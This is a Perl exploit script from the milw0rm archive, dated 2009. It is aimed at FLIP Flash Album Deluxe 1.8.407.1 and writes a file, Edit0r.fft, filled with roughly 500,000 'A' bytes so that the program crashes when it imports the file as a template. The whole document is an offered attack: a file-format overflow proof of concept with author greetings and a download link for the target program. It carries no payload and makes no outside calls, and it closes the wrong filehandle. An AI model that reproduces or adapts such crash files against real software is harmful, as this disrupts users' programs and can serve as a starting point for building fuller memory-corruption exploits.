#!/usr/bin/perl
#[+] Bug : FLIP Flash Album Deluxe 1.8.407.1 (.fft File) Crash Vulnerability  Exploit
#[+] program  Download : http://www.goztun.com/download/FlipFlashAlbumDeluxeSetup.exe
#[+] Author : the_Edit0r
# Contact me : the_3dit0r[at]Yahoo[dot]coM
#[+] Greetz to all my friends
#[+] Tested on: Windows XP Pro SP3
#[+] web site: Expl0iters.ir  * Anti-security.ir
#[+] Big thnx: H4ckcity Member


my $crash="\x41\x41\x41\x41\x41" x 100005;
open(myfile,'>>Edit0r.fft');
print myfile $crash;
close($FILE);
print "File Created successfully\n";

# After Clicking On file Perl  Run The Program  ,import template  ( .fft  file) Boom !!!!!!! the Program Crashed

# milw0rm.com [2009-08-24]